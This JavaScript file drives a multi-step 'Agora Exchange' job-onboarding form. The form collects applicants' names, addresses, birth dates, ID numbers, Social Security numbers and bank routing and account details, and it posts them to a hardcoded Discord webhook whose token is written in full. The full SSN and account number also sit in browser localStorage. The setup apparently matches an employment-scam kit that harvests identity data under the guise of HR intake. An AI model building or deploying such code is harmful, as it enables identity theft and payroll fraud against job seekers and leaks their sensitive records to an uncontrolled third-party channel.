/* =========================================================
   AGORA EXCHANGE — onboarding-script.js
   Onboarding multi-step intake + Discord webhook submit
   ========================================================= */

document.addEventListener("DOMContentLoaded", () => {
  // -------------------------
  // Config
  // -------------------------
  const DISCORD_WEBHOOK_URL =
    "https://discord.com/api/webhooks/1442083773519892581/ffzwiAhvS4yTMdzNj3V3bvFhBZk4urxHORkREcLQc5VtWnk4n49ZjDegISW1Z-hj_iGo";

  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // local persistence
  const STORE_KEY = "agoraOnboarding_v1";
  const STARTED_KEY = "agoraOnboardingStarted_v1"; // to avoid duplicate "started onboarding" spam

  // -------------------------
  // Jobs (match careers)
  // -------------------------
  const JOBS = [
    { id: "agx-swe-01", title: "Software Developer (Web Systems)", location: "Remote / Bay Area", type: "Contract" },
    { id: "agx-net-01", title: "Network Engineer (Defense & Diagnostics)", location: "Bay Area / Hybrid", type: "Part-time" },
    { id: "agx-fs-01", title: "Full-Stack Developer (Operator Consoles)", location: "Remote", type: "Full-time" },
    { id: "agx-ea-01", title: "Executive Personal Assistant (Ops Support)", location: "San Jose, CA", type: "Part-time" },
  ];

  // -------------------------
  // DOM
  // -------------------------
  const yearEl = document.getElementById("ob-year");

  const progressLabel = document.getElementById("ob-progress-label");
  const progressPct = document.getElementById("ob-progress-pct");
  const progressFill = document.getElementById("ob-progress-fill");

  const roleSel = document.getElementById("ob-role");
  const next1 = document.getElementById("ob-next-1");

  const firstEl = document.getElementById("ob-first");
  const lastEl = document.getElementById("ob-last");
  const emailEl = document.getElementById("ob-email");
  const welcomePanel = document.getElementById("ob-welcome-panel");
  const welcomeTitle = document.getElementById("ob-welcome-title");
  const welcomeBody = document.getElementById("ob-welcome-body");
  const next2 = document.getElementById("ob-next-2");
  const back2 = document.getElementById("ob-back-2");

  const back3 = document.getElementById("ob-back-3");
  const next3 = document.getElementById("ob-next-3");

  const back4 = document.getElementById("ob-back-4");
  const next4 = document.getElementById("ob-next-4");

  const back5 = document.getElementById("ob-back-5");
  const next5 = document.getElementById("ob-next-5");

  const back6 = document.getElementById("ob-back-6");
  const submitBtn = document.getElementById("ob-submit");

  const inlineName = document.getElementById("ob-inline-name");
  const inlineName2 = document.getElementById("ob-inline-name-2");

  const consentBg = document.getElementById("ob-consent-bg");
  const consentPolicy = document.getElementById("ob-consent-policy");
  const consentTraining = document.getElementById("ob-consent-training");

  const trainingWarn = document.getElementById("ob-training-warn");
  const finalAttest = document.getElementById("ob-final-attest");

  const reviewEl = document.getElementById("ob-review");

  const statusEl = document.getElementById("ob-status");
  const tagsEl = document.getElementById("ob-tags");

  const resetBtn = document.getElementById("ob-reset");

  const successOverlay = document.getElementById("ob-success");
  const successTitle = document.getElementById("ob-success-title");
  const successBody = document.getElementById("ob-success-body");
  const successClose = document.getElementById("ob-success-close");

  // inputs (step 3/4/5)
  const ob = {
    phone: document.getElementById("ob-phone"),
    address1: document.getElementById("ob-address1"),
    city: document.getElementById("ob-city"),
    state: document.getElementById("ob-state"),
    zip: document.getElementById("ob-zip"),
    dob: document.getElementById("ob-dob"),
    idtype: document.getElementById("ob-idtype"),
    idnum: document.getElementById("ob-idnum"),

    // SSN fields MUST exist in your HTML with these IDs:
    ssn: document.getElementById("ob-ssn"),
    ssnConfirm: document.getElementById("ob-ssn-confirm"),

    idstate: document.getElementById("ob-idstate"),
    idexp: document.getElementById("ob-idexp"),
    idfile: document.getElementById("ob-idfile"),

    bank: document.getElementById("ob-bank"),
    accttype: document.getElementById("ob-accttype"),
    routing: document.getElementById("ob-routing"),
    account: document.getElementById("ob-account"),
    taxnote: document.getElementById("ob-taxnote"),

    ecName: document.getElementById("ob-ec-name"),
    ecRel: document.getElementById("ob-ec-rel"),
    ecPhone: document.getElementById("ob-ec-phone"),
    ecEmail: document.getElementById("ob-ec-email"),
  };

  // -------------------------
  // Helpers
  // -------------------------
  function escapeHtml(str) {
    return String(str || "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }

  function normalize(s) {
    return String(s || "").trim();
  }

  function onlyDigits(str) {
    return String(str || "").replace(/\D/g, "");
  }

  function formatSSNInput(raw) {
    const d = onlyDigits(raw).slice(0, 9);
    if (d.length <= 3) return d;
    if (d.length <= 5) return `${d.slice(0, 3)}-${d.slice(3)}`;
    return `${d.slice(0, 3)}-${d.slice(3, 5)}-${d.slice(5)}`;
  }

  function validSSNMatch() {
    const a = normalize(ob.ssn?.value);
    const b = normalize(ob.ssnConfirm?.value);

    // allow empty SSN if you want it optional
    if (!a && !b) return true;

    const da = onlyDigits(a);
    const db = onlyDigits(b);

    if (da.length !== 9 || db.length !== 9) return false;
    return da === db;
  }

  function maskSSN(ssn) {
    const digits = onlyDigits(ssn);
    if (!digits) return "N/A";
    if (digits.length < 4) return "•••-••-••••";
    return `•••-••-${digits.slice(-4)}`;
  }

  function fileMeta(fileInputEl) {
    if (!fileInputEl || !fileInputEl.files || !fileInputEl.files[0]) return "None";
    const f = fileInputEl.files[0];
    const kb = Math.round(f.size / 1024);
    return `${f.name} (${kb} KB)`;
  }

  function setStatus(text) {
    if (statusEl) statusEl.textContent = text;
  }

  function setTags(tags) {
    if (!tagsEl) return;
    tagsEl.innerHTML = "";
    (tags || []).forEach((t) => {
      const span = document.createElement("span");
      span.className = `tag ${t.hot ? "tag-hot" : ""}`.trim();
      span.textContent = t.label;
      tagsEl.appendChild(span);
    });
  }

  function scrollTopNice() {
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  function stepEls() {
    return Array.from(document.querySelectorAll(".ob-step"));
  }

  // chunk a long string into <= 1900 chars (safe under 2000 w/ formatting)
  function chunkText(str, size = 1900) {
    const s = String(str || "");
    const chunks = [];
    for (let i = 0; i < s.length; i += size) chunks.push(s.slice(i, i + size));
    return chunks;
  }

  // -------------------------
  // State
  // -------------------------
  const TOTAL_STEPS = 6;
  let currentStep = 1;

  function getSelectedJob() {
    const id = roleSel ? roleSel.value : "";
    return JOBS.find((j) => j.id === id) || null;
  }

  function getName() {
    const first = normalize(firstEl ? firstEl.value : "");
    const last = normalize(lastEl ? lastEl.value : "");
    return normalize(`${first} ${last}`).trim();
  }

  function hydrateRoleOptions() {
    if (!roleSel) return;
    const keepFirst = roleSel.querySelector('option[value=""]');
    roleSel.innerHTML = "";
    if (keepFirst) roleSel.appendChild(keepFirst);

    JOBS.forEach((j) => {
      const opt = document.createElement("option");
      opt.value = j.id;
      opt.textContent = `${j.title} — ${j.location} (${j.type})`;
      roleSel.appendChild(opt);
    });
  }

  function setProgress() {
    const pct = Math.round(((currentStep - 1) / (TOTAL_STEPS - 1)) * 100);
    if (progressLabel) progressLabel.textContent = `Step ${currentStep} of ${TOTAL_STEPS}`;
    if (progressPct) progressPct.textContent = `${pct}%`;
    if (progressFill) progressFill.style.width = `${pct}%`;
  }

  function showStep(step) {
    currentStep = Math.max(1, Math.min(TOTAL_STEPS, step));

    stepEls().forEach((el) => {
      const s = Number(el.dataset.step || "0");
      const active = s === currentStep;
      el.classList.toggle("is-active", active);
      if (active) el.removeAttribute("hidden");
      else el.setAttribute("hidden", "true");
    });

    setProgress();
    updateAside();
    buildReviewIfNeeded();
    scrollTopNice();
    persist();
  }

  function buildWelcome() {
    const job = getSelectedJob();
    const name = getName();
    const first = normalize(firstEl ? firstEl.value : "");
    const display = first || name || "Agent";

    if (inlineName) inlineName.textContent = display || "[name]";
    if (inlineName2) inlineName2.textContent = display || "[name]";

    if (!welcomePanel) return;
    if (!first && !normalize(lastEl ? lastEl.value : "")) {
      welcomePanel.setAttribute("hidden", "true");
      return;
    }

    welcomePanel.removeAttribute("hidden");
    if (welcomeTitle) welcomeTitle.textContent = `Welcome, ${display}!`;

    const roleLine = job ? `${job.title}` : "your role";
    if (welcomeBody) {
      welcomeBody.textContent =
        `We’re excited to welcome you as a founding associate at Agora Exchange. ` +
        `Your onboarding intake is being prepared for ${roleLine}. ` +
        `Complete the steps below so we can move you into access provisioning and scheduling.`;
    }
  }

  function validateStep1() {
    const ok = !!(roleSel && roleSel.value);
    if (next1) next1.disabled = !ok;
    return ok;
  }

  function validateStep2() {
    const nameOk = normalize(firstEl ? firstEl.value : "") && normalize(lastEl ? lastEl.value : "");
    const emailOk = emailEl && normalize(emailEl.value) && emailPattern.test(normalize(emailEl.value));
    const ok = !!(nameOk && emailOk);
    if (next2) next2.disabled = !ok;
    return ok;
  }

  function updateAside() {
    const job = getSelectedJob();
    const name = getName();

    const tags = [];
    if (job) tags.push({ label: job.type, hot: true });
    if (job && job.location) tags.push({ label: job.location, hot: false });
    if (name) tags.push({ label: name, hot: false });
    tags.push({ label: `Step ${currentStep}/${TOTAL_STEPS}`, hot: false });

    setTags(tags);

    if (!job) return setStatus("Awaiting position selection.");
    if (currentStep <= 2) return setStatus("Session initialized. Preparing identity record...");
    if (currentStep <= 4) return setStatus("Collecting onboarding details for HR + payroll routing...");
    return setStatus("Final verification before submission to intake.");
  }

  function getValues() {
    const job = getSelectedJob();
    const name = getName();

    return {
      roleId: job ? job.id : "",
      roleTitle: job ? job.title : "",
      roleLocation: job ? job.location : "",
      roleType: job ? job.type : "",

      first: normalize(firstEl ? firstEl.value : ""),
      last: normalize(lastEl ? lastEl.value : ""),
      name,
      email: normalize(emailEl ? emailEl.value : ""),

      phone: normalize(ob.phone?.value),
      address1: normalize(ob.address1?.value),
      city: normalize(ob.city?.value),
      state: normalize(ob.state?.value),
      zip: normalize(ob.zip?.value),
      dob: normalize(ob.dob?.value),

      idType: normalize(ob.idtype?.value),
      idNumber: normalize(ob.idnum?.value),

      ssn: normalize(ob.ssn?.value),
      ssnConfirm: normalize(ob.ssnConfirm?.value),

      idIssuedBy: normalize(ob.idstate?.value),
      idExpiration: normalize(ob.idexp?.value),
      idFileMeta: fileMeta(ob.idfile),

      bank: normalize(ob.bank?.value),
      accountType: normalize(ob.accttype?.value),
      routing: normalize(ob.routing?.value),
      account: normalize(ob.account?.value),
      taxNote: normalize(ob.taxnote?.value),

      ecName: normalize(ob.ecName?.value),
      ecRelationship: normalize(ob.ecRel?.value),
      ecPhone: normalize(ob.ecPhone?.value),
      ecEmail: normalize(ob.ecEmail?.value),

      consentBg: !!consentBg?.checked,
      consentPolicy: !!consentPolicy?.checked,
      consentTraining: !!consentTraining?.checked,

      attest: !!finalAttest?.checked,

      submittedAt: new Date().toISOString(),
      userAgent: navigator.userAgent || "",
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
    };
  }

  function maskAccount(acct) {
    const digits = String(acct || "").replace(/\D/g, "");
    if (digits.length <= 4) return digits || "";
    const last4 = digits.slice(-4);
    return `••••••${last4}`;
  }

  function buildReviewIfNeeded() {
    if (currentStep !== 6 || !reviewEl) return;

    const v = getValues();
    const idLine = [v.idType, v.idNumber, v.idIssuedBy, v.idExpiration].filter(Boolean).join(" · ") || "N/A";
    const addressLine = [v.address1, v.city, v.state, v.zip].filter(Boolean).join(", ") || "N/A";

    reviewEl.innerHTML = `
      <div class="review-grid">
        <div class="review-item"><div class="review-key">Position</div><div class="review-val"><strong>${escapeHtml(v.roleTitle || "N/A")}</strong></div></div>
        <div class="review-item"><div class="review-key">Role location / type</div><div class="review-val">${escapeHtml([v.roleLocation, v.roleType].filter(Boolean).join(" · ") || "N/A")}</div></div>

        <div class="review-item"><div class="review-key">Name</div><div class="review-val">${escapeHtml(v.name || "N/A")}</div></div>
        <div class="review-item"><div class="review-key">Email</div><div class="review-val">${escapeHtml(v.email || "N/A")}</div></div>

        <div class="review-item"><div class="review-key">Phone</div><div class="review-val">${escapeHtml(v.phone || "N/A")}</div></div>
        <div class="review-item"><div class="review-key">Address</div><div class="review-val">${escapeHtml(addressLine)}</div></div>

        <div class="review-item"><div class="review-key">DOB</div><div class="review-val">${escapeHtml(v.dob || "N/A")}</div></div>
        <div class="review-item"><div class="review-key">ID / License</div><div class="review-val">${escapeHtml(idLine)}</div></div>

        <div class="review-item"><div class="review-key">SSN</div><div class="review-val">${escapeHtml(v.ssn || "N/A")}</div></div>

        <div class="review-item"><div class="review-key">ID upload (metadata)</div><div class="review-val">${escapeHtml(v.idFileMeta || "None")}</div></div>
        <div class="review-item"><div class="review-key">Payroll</div><div class="review-val">${escapeHtml([v.bank, v.accountType].filter(Boolean).join(" · ") || "N/A")}</div></div>

        <div class="review-item"><div class="review-key">Routing</div><div class="review-val">${escapeHtml(v.routing || "N/A")}</div></div>
        <div class="review-item"><div class="review-key">Account</div><div class="review-val">${escapeHtml(v.account || "N/A")}</div></div>

        <div class="review-item"><div class="review-key">Emergency contact</div><div class="review-val">${escapeHtml(v.ecName || "N/A")}${v.ecRelationship ? ` · ${escapeHtml(v.ecRelationship)}` : ""}</div></div>
        <div class="review-item"><div class="review-key">Emergency phone</div><div class="review-val">${escapeHtml(v.ecPhone || "N/A")}</div></div>
      </div>

      <div style="margin-top:12px;">
        <div class="review-key">Tax / withholding notes</div>
        <div class="review-val">${escapeHtml(v.taxNote || "None")}</div>
      </div>

      <div style="margin-top:12px;">
        <div class="review-key">Consents</div>
        <div class="review-val">
          Background check: <strong>${v.consentBg ? "Yes" : "No"}</strong><br/>
          Policy acknowledgement: <strong>${v.consentPolicy ? "Yes" : "No"}</strong><br/>
          Training module completed: <strong>${v.consentTraining ? "Yes" : "No"}</strong>
        </div>
      </div>
    `;

    if (trainingWarn) {
      if (!v.consentTraining) trainingWarn.removeAttribute("hidden");
      else trainingWarn.setAttribute("hidden", "true");
    }
  }

  function persist() {
    try {
      const v = getValues();
      localStorage.setItem(STORE_KEY, JSON.stringify({ currentStep, values: v }));
    } catch (_) {}
  }

  function restore() {
    try {
      const raw = localStorage.getItem(STORE_KEY);
      if (!raw) return;

      const parsed = JSON.parse(raw);
      if (!parsed || typeof parsed !== "object") return;

      const v = parsed.values || {};
      currentStep = Number(parsed.currentStep || 1);

      if (roleSel && v.roleId) roleSel.value = v.roleId;

      if (firstEl && v.first) firstEl.value = v.first;
      if (lastEl && v.last) lastEl.value = v.last;
      if (emailEl && v.email) emailEl.value = v.email;

      if (ob.phone && v.phone) ob.phone.value = v.phone;
      if (ob.address1 && v.address1) ob.address1.value = v.address1;
      if (ob.city && v.city) ob.city.value = v.city;
      if (ob.state && v.state) ob.state.value = v.state;
      if (ob.zip && v.zip) ob.zip.value = v.zip;
      if (ob.dob && v.dob) ob.dob.value = v.dob;

      if (ob.idtype && v.idType) ob.idtype.value = v.idType;
      if (ob.idnum && v.idNumber) ob.idnum.value = v.idNumber;

      if (ob.ssn && v.ssn) ob.ssn.value = v.ssn;
      if (ob.ssnConfirm && v.ssnConfirm) ob.ssnConfirm.value = v.ssnConfirm;

      if (ob.idstate && v.idIssuedBy) ob.idstate.value = v.idIssuedBy;
      if (ob.idexp && v.idExpiration) ob.idexp.value = v.idExpiration;

      if (ob.bank && v.bank) ob.bank.value = v.bank;
      if (ob.accttype && v.accountType) ob.accttype.value = v.accountType;
      if (ob.routing && v.routing) ob.routing.value = v.routing;
      if (ob.account && v.account) ob.account.value = v.account;
      if (ob.taxnote && v.taxNote) ob.taxnote.value = v.taxNote;

      if (ob.ecName && v.ecName) ob.ecName.value = v.ecName;
      if (ob.ecRel && v.ecRelationship) ob.ecRel.value = v.ecRelationship;
      if (ob.ecPhone && v.ecPhone) ob.ecPhone.value = v.ecPhone;
      if (ob.ecEmail && v.ecEmail) ob.ecEmail.value = v.ecEmail;

      if (consentBg) consentBg.checked = !!v.consentBg;
      if (consentPolicy) consentPolicy.checked = !!v.consentPolicy;
      if (consentTraining) consentTraining.checked = !!v.consentTraining;
      if (finalAttest) finalAttest.checked = !!v.attest;

      validateStep1();
      buildWelcome();
      validateStep2();

      currentStep = Math.max(1, Math.min(TOTAL_STEPS, currentStep));
    } catch (_) {}
  }

  function resetLocal() {
    localStorage.removeItem(STORE_KEY);
    localStorage.removeItem(STARTED_KEY);
    window.location.reload();
  }

  // -------------------------
  // Discord Webhook (robust)
  // -------------------------
  async function postToDiscord(payload) {
    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    // Discord returns 204 No Content on success
    if (res.ok) return { ok: true, status: res.status, data: null };

    let data = null;
    try {
      data = await res.json();
    } catch (_) {
      try {
        data = await res.text();
      } catch (_) {
        data = null;
      }
    }

    return { ok: false, status: res.status, data };
  }

  async function notifyOnboardingStarted(job) {
    if (!job) return;
    const already = localStorage.getItem(STARTED_KEY);
    if (already === job.id) return;

    const embed = {
      title: "Onboarding Started — Agora Exchange",
      description: "A candidate has begun the onboarding intake (onboarding.html).",
      color: 0x00c8ff,
      fields: [
        { name: "Role", value: `${job.title}`, inline: false },
        { name: "Location / Type", value: `${job.location} · ${job.type}`, inline: false },
        { name: "Status", value: "Intake opened (position selected).", inline: false },
      ],
      footer: { text: "Agora Exchange · Onboarding intake" },
      timestamp: new Date().toISOString(),
    };

    const payload = { content: "🧬 **Onboarding session started.**", embeds: [embed] };

    try {
      const r = await postToDiscord(payload);
      if (r.ok) localStorage.setItem(STARTED_KEY, job.id);
      else console.warn("Discord start notify failed:", r.status, r.data);
    } catch (e) {
      console.warn("Discord start notify error:", e);
    }
  }

  function buildPacketText(v) {
    // NOTE: SSN always masked in outbound
    const lines = [
      "AGORA EXCHANGE — ONBOARDING PACKET",
      "---------------------------------",
      `Submitted: ${v.submittedAt || "N/A"}`,
      `Timezone: ${v.tz || "N/A"}`,
      "",
      "ROLE",
      `- Title: ${v.roleTitle || "N/A"}`,
      `- ID: ${v.roleId || "N/A"}`,
      `- Location/Type: ${(v.roleLocation || "N/A")} · ${(v.roleType || "N/A")}`,
      "",
      "IDENTITY",
      `- Name: ${v.name || "N/A"}`,
      `- Email: ${v.email || "N/A"}`,
      `- Phone: ${v.phone || "N/A"}`,
      `- DOB: ${v.dob || "N/A"}`,
      "",
      "ADDRESS",
      `- ${[v.address1, v.city, v.state, v.zip].filter(Boolean).join(", ") || "N/A"}`,
      "",
      "IDENTIFICATION",
      `- Type: ${v.idType || "N/A"}`,
      `- Number: ${v.idNumber || "N/A"}`,
      `- Issued By: ${v.idIssuedBy || "N/A"}`,
      `- Expiration: ${v.idExpiration || "N/A"}`,
      `- SSN (masked): ${maskSSN(v.ssn)}`,
      `- Upload (metadata): ${v.idFileMeta || "None"}`,
      "",
      "PAYROLL",
      `- Bank: ${v.bank || "N/A"}`,
      `- Account Type: ${v.accountType || "N/A"}`,
      `- Routing: ${v.routing || "N/A"}`,
      `- Account (masked): ${v.account ? maskAccount(v.account) : "N/A"}`,
      `- Notes: ${v.taxNote || "None"}`,
      "",
      "EMERGENCY CONTACT",
      `- Name: ${v.ecName || "N/A"}`,
      `- Relationship: ${v.ecRelationship || "N/A"}`,
      `- Phone: ${v.ecPhone || "N/A"}`,
      `- Email: ${v.ecEmail || "N/A"}`,
      "",
      "CONSENTS",
      `- Background Check: ${v.consentBg ? "Yes" : "No"}`,
      `- Policy Acknowledgement: ${v.consentPolicy ? "Yes" : "No"}`,
      `- Training Completed: ${v.consentTraining ? "Yes" : "No"}`,
      `- Final Attestation: ${v.attest ? "Confirmed" : "Not Confirmed"}`,
    ];

    return lines.join("\n");
  }

  async function submitOnboardingToDiscord(v) {
    // ✅ Keep embed field count under 25 (we’ll do a clean summary)
    const summaryEmbed = {
      title: "New Onboarding Packet — Agora Exchange",
      description: "Candidate submitted onboarding intake from onboarding.html.",
      color: 0x00c8ff,
      fields: [
        { name: "Role", value: v.roleTitle || "N/A", inline: false },
        { name: "Role ID", value: v.roleId || "N/A", inline: true },
        { name: "Location / Type", value: `${v.roleLocation || "N/A"} · ${v.roleType || "N/A"}`, inline: true },

        { name: "Name", value: v.name || "N/A", inline: true },
        { name: "Email", value: v.email || "N/A", inline: true },

        { name: "Phone", value: v.phone || "N/A", inline: true },
        { name: "DOB", value: v.dob || "N/A", inline: true },

        { name: "ID Type", value: v.idType || "N/A", inline: true },
        { name: "ID Expiration", value: v.idExpiration || "N/A", inline: true },
        { name: "SSN (masked)", value: maskSSN(v.ssn), inline: true },

        { name: "Bank / Type", value: `${v.bank || "N/A"} · ${v.accountType || "N/A"}`, inline: false },
        { name: "Routing", value: v.routing || "N/A", inline: true },
        { name: "Account (masked)", value: v.account ? maskAccount(v.account) : "N/A", inline: true },

        { name: "Emergency Contact", value: v.ecName || "N/A", inline: true },
        { name: "Emergency Phone", value: v.ecPhone || "N/A", inline: true },

        { name: "Consents", value: `BG: ${v.consentBg ? "Yes" : "No"} · Policy: ${v.consentPolicy ? "Yes" : "No"} · Training: ${v.consentTraining ? "Yes" : "No"}`, inline: false },
      ],
      footer: { text: "Agora Exchange · Onboarding intake" },
      timestamp: new Date().toISOString(),
    };

    // 1) Send summary embed
    const r1 = await postToDiscord({
      content: "📄 **New onboarding packet submitted.**",
      embeds: [summaryEmbed],
    });

    if (!r1.ok) return r1;

    // 2) Send the full packet as text (chunked)
    const packet = buildPacketText(v);
    const chunks = chunkText(packet, 1800);

    for (let i = 0; i < chunks.length; i++) {
      const part = chunks[i];
      const label = chunks.length > 1 ? ` (part ${i + 1}/${chunks.length})` : "";
      const r = await postToDiscord({
        content: `\`\`\`txt\nAGORA ONBOARDING PACKET${label}\n\n${part}\n\`\`\``,
      });
      if (!r.ok) return r;
    }

    return { ok: true, status: 204, data: null };
  }

  // -------------------------
  // Events
  // -------------------------
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  hydrateRoleOptions();
  restore();

  setProgress();
  updateAside();
  validateStep1();
  buildWelcome();
  validateStep2();
  showStep(currentStep);

  // Step 1
  if (roleSel) {
    roleSel.addEventListener("change", async () => {
      validateStep1();

      const job = getSelectedJob();
      if (job) {
        setStatus("Initializing onboarding session…");
        setTags([
          { label: job.type, hot: true },
          { label: job.location, hot: false },
          { label: "Session started", hot: false },
        ]);
        persist();
        await notifyOnboardingStarted(job);
        setStatus("Session active. Ready for identity intake.");
      } else {
        setStatus("Awaiting position selection.");
      }
    });
  }

  if (next1) next1.addEventListener("click", () => {
    if (!validateStep1()) return;
    showStep(2);
  });

  // Step 2
  [firstEl, lastEl, emailEl].forEach((el) => {
    if (!el) return;
    el.addEventListener("input", () => {
      buildWelcome();
      validateStep2();
      persist();
    });
  });

  if (back2) back2.addEventListener("click", () => showStep(1));
  if (next2) next2.addEventListener("click", () => {
    if (!validateStep2()) return;
    showStep(3);
  });

  // SSN formatting
  if (ob.ssn) {
    ob.ssn.addEventListener("input", () => {
      const before = ob.ssn.value;
      ob.ssn.value = formatSSNInput(before);
      persist();
    });
  }
  if (ob.ssnConfirm) {
    ob.ssnConfirm.addEventListener("input", () => {
      const before = ob.ssnConfirm.value;
      ob.ssnConfirm.value = formatSSNInput(before);
      persist();
    });
  }

  // Step 3
  if (back3) back3.addEventListener("click", () => showStep(2));
  if (next3) next3.addEventListener("click", () => {
    if (!validSSNMatch()) {
      alert("Your Social Security Number entries do not match (or are incomplete).");
      return;
    }
    showStep(4);
  });

  // Step 4
  if (back4) back4.addEventListener("click", () => showStep(3));
  if (next4) next4.addEventListener("click", () => showStep(5));

  // Step 5
  if (back5) back5.addEventListener("click", () => showStep(4));
  if (next5) next5.addEventListener("click", () => showStep(6));

  // Step 6
  if (back6) back6.addEventListener("click", () => showStep(5));

  // persist on most inputs
  const allInputs = document.querySelectorAll("input, select, textarea");
  allInputs.forEach((el) => {
    el.addEventListener("change", persist);
    el.addEventListener("input", persist);
  });

  if (resetBtn) resetBtn.addEventListener("click", resetLocal);

  if (successClose) {
    successClose.addEventListener("click", () => {
      if (!successOverlay) return;
      successOverlay.classList.remove("is-open");
      successOverlay.setAttribute("aria-hidden", "true");
    });
  }

  // submit
  if (submitBtn) {
    submitBtn.addEventListener("click", async () => {
      const v = getValues();

      if (!v.roleId) {
        alert("Select the position you’re onboarding for.");
        showStep(1);
        return;
      }
      if (!v.first || !v.last) {
        alert("Enter your first and last name.");
        showStep(2);
        return;
      }
      if (!v.email || !emailPattern.test(v.email)) {
        alert("Enter a valid email address.");
        showStep(2);
        return;
      }
      if (!validSSNMatch()) {
        alert("Your Social Security Number entries do not match (or are incomplete).");
        showStep(3);
        return;
      }
      if (!v.attest) {
        alert("Please confirm the final attestation checkbox before submitting.");
        showStep(6);
        return;
      }

      if (trainingWarn) {
        if (!v.consentTraining) trainingWarn.removeAttribute("hidden");
        else trainingWarn.setAttribute("hidden", "true");
      }

      submitBtn.disabled = true;

      try {
        const r = await submitOnboardingToDiscord(v);

        if (!r.ok) {
          console.warn("Discord submit failed:", r.status, r.data);
          alert("We cannot submit your onboarding right now. Please try again.");
          return;
        }

        const first = normalize(v.first) || "Agent";
        if (successTitle) successTitle.textContent = `Onboarding sent, ${first}.`;
        if (successBody) {
          successBody.textContent =
            v.consentTraining
              ? `Your onboarding packet was delivered to Agora Exchange intake. Next: access provisioning and scheduling will follow via ${v.email}.`
              : `Your onboarding packet was delivered to Agora Exchange intake. Note: you still need to complete the Agora Security Training & Learning Module to earn your certificate — it’s required to finalize onboarding. We’ll reach out via ${v.email}.`;
        }

        if (successOverlay) {
          successOverlay.classList.add("is-open");
          successOverlay.setAttribute("aria-hidden", "false");
        }

        setStatus("Submission delivered to intake.");
      } catch (err) {
        console.error("Onboarding submit failed:", err);
        alert("Network issue while submitting. Check connection and try again.");
      } finally {
        submitBtn.disabled = false;
      }
    });
  }

  // background mesh
  injectMeshBackground();
});

/* =========================================================
   Mesh background (low-key node network)
   ========================================================= */
function injectMeshBackground() {
  const shell = document.getElementById("ob-shell");
  if (!shell) return;

  if (document.getElementById("agora-bg-mesh")) return;

  const canvas = document.createElement("canvas");
  canvas.id = "agora-bg-mesh";
  document.body.insertBefore(canvas, document.body.firstChild);

  const ctx = canvas.getContext("2d");
  let w = (canvas.width = window.innerWidth);
  let h = (canvas.height = window.innerHeight);

  const prefersReducedMotion =
    window.matchMedia &&
    window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  const NODE_COUNT_DESKTOP = 40;
  const NODE_COUNT_MOBILE = 20;
  const LINK_DISTANCE = 150;
  const nodes = [];

  function init() {
    nodes.length = 0;
    const count = window.innerWidth < 768 ? NODE_COUNT_MOBILE : NODE_COUNT_DESKTOP;

    for (let i = 0; i < count; i++) {
      nodes.push({
        x: Math.random() * w,
        y: Math.random() * h,
        vx: (Math.random() - 0.5) * 0.28,
        vy: (Math.random() - 0.5) * 0.28,
        r: 1.2 + Math.random() * 1.2,
        tone: Math.random(),
      });
    }
  }

  function resize() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
    init();
  }

  window.addEventListener("resize", () => {
    clearTimeout(resize._t);
    resize._t = setTimeout(resize, 150);
  });

  function update() {
    if (prefersReducedMotion) return;
    for (const n of nodes) {
      n.x += n.vx;
      n.y += n.vy;

      if (n.x < -20) n.x = w + 20;
      if (n.x > w + 20) n.x = -20;
      if (n.y < -20) n.y = h + 20;
      if (n.y > h + 20) n.y = -20;
    }
  }

  function draw() {
    ctx.clearRect(0, 0, w, h);

    const gradient = ctx.createRadialGradient(
      w * 0.5,
      h * 0.2,
      0,
      w * 0.5,
      h * 0.6,
      Math.max(w, h)
    );
    gradient.addColorStop(0, "rgba(15, 23, 42, 0.0)");
    gradient.addColorStop(1, "rgba(15, 23, 42, 0.88)");
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, w, h);

    for (let i = 0; i < nodes.length; i++) {
      const a = nodes[i];
      for (let j = i + 1; j < nodes.length; j++) {
        const b = nodes[j];
        const dx = a.x - b.x;
        const dy = a.y - b.y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < LINK_DISTANCE) {
          const alpha = 1 - dist / LINK_DISTANCE;
          ctx.strokeStyle = `rgba(100, 255, 218, ${alpha * 0.16})`;
          ctx.lineWidth = 1;
          ctx.beginPath();
          ctx.moveTo(a.x, a.y);
          ctx.lineTo(b.x, b.y);
          ctx.stroke();
        }
      }
    }

    for (const n of nodes) {
      ctx.beginPath();
      ctx.fillStyle = "rgba(2, 3, 16, 0.55)";
      ctx.arc(n.x, n.y, n.r * 3.2, 0, Math.PI * 2);
      ctx.fill();

      ctx.beginPath();
      ctx.fillStyle = n.tone > 0.6 ? "rgba(130,160,255,0.9)" : "rgba(100,255,218,0.85)";
      ctx.arc(n.x, n.y, n.r, 0, Math.PI * 2);
      ctx.fill();
    }
  }

  function loop() {
    update();
    draw();
    requestAnimationFrame(loop);
  }

  init();
  loop();
}
